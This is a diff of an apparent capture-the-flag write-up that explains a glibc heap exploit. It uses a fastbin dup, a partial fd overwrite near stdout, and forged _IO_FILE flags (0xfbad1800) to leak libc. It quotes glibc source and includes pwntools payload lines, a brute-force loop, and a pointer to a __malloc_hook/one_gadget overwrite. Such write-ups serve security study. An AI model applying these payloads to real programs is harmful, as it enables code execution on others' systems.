@@ -219,17 +219,86 @@ and
 ```
 we can again change our code and when we change the size to 0x71, we partially overwrite the fd to point near &stdout-0x43
 why ? :
-because we need to overwrite the flags  and other fields of stdout structure with the following :
-
-```python
-_flags = 0xfbad0000  // Magic number
-_flags & = ~_IO_NO_WRITES // _flags = 0xfbad0000
-_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800
-_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800
+when the binary calls `puts`, `puts` internally will call a function named `_IO_new_file_xsputn` which will call eventually `_IO_new_file_overflow`
+```C
+size_t  _IO_new_file_xsputn (FILE *f, const void *data, size_t n)
+{
+    const char *s = (const char *) data;
+    size_t to_do = n;
+    int must_flush = 0;
+    size_t count = 0;
+    ...
+     if (to_do + must_flush > 0)
+    {
+      size_t block_size, do_write;
+      /* Next flush the (full) buffer. */
+      if (_IO_OVERFLOW (f, EOF) == EOF)
+    /* If nothing else has to be written.  */
+    ...
 ```
-for more details check <a href="https://vigneshsrao.github.io/babytcache/">here</a>
 
-&stdout-0x71 is the only viable place with a valid size (0x7f)
+
+```C
+int _IO_new_file_overflow (_IO_FILE *f, int ch)
+{
+  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
+    {
+      f->_flags |= _IO_ERR_SEEN;
+      __set_errno (EBADF);
+      return EOF;
+    }
+  /* If currently reading or no buffer allocated. */
+  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
+    {
+      :
+      :
+    }
+  if (ch == EOF)
+    return _IO_do_write (f, f->_IO_write_base,  // our target
+             f->_IO_write_ptr - f->_IO_write_base);
+``` 
+
+`_IO_do_write ` is called the end after some checks, we just need to set `f->_flags=_IO_NO_WRITES=0` and `f->_flags & _IO_CURRENTLY_PUTTING) == 0`
+
+`_IO_do_write`  will call `new_do_write`
+
+```C
+static
+_IO_size_t
+new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
+{
+  _IO_size_t count;
+  if (fp->_flags & _IO_IS_APPENDING)
+    /* On a system without a proper O_APPEND implementation,
+       you would need to sys_seek(0, SEEK_END) here, but is
+       not needed nor desirable for Unix- or Posix-like systems.
+       Instead, just indicate that offset (before and after) is
+       unpredictable. */
+    fp->_offset = _IO_pos_BAD;
+  else if (fp->_IO_read_end != fp->_IO_write_base)
+    {
+      _IO_off64_t new_pos
+    = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
+      if (new_pos == _IO_pos_BAD)
+    return 0;
+      fp->_offset = new_pos;
+    }
+  count = _IO_SYSWRITE (fp, data, to_do);
+```
+
+and `_IO_SYSWRITE` is basically `write`
+
+```C
+#define _IO_SYSWRITE(FP, DATA, LEN) JUMP2 (__write, FP, DATA, LEN)
+```
+
+`_IO_SYSWRITE` is called with `fp->_IO_write_base` as arg, so we can partially overwrite  the last byte there, and get some leaks
+we also need to set `fp->_IO_IS_APPENDING`
+```python
+malloc(0x70-8, 'D'*27 + p64(0x0)*3 + p64(0xfbad1800) + p64(0x0)*3 + "\x08")```
+
+
+Finally we will use the address at &stdout-0x71 , because it is the only viable place with a valid size (0x7f) before &stdout:
 
 ```python
 0x7fc1cadfc5dd <_IO_2_1_stderr_+157>:   0xc1cadfb660000000  0x000000000000007f
@@ -245,13 +314,13 @@ we will run our exploit in a while loop with a try catch block :
 ```python
 malloc(0x70-8, 'D'*27 + p64(0x0)*3 + p64(0xfbad1800) + p64(0x0)*3 + "\x08")
 try :
-    leak = p.recvuntil('***********************')
+    leak = p.recv()
     print leak
     p.interactive()
 except :
     pass
 ```
-```bash
+```
 while :; do  python exploit.py; done```
 
 and eventually we will hit the jackpot and get a leak, after this we we still have 5 possible allocations, which is more than enough for a second fastbin dup on __malloc_hook and overwrite with one_gadget
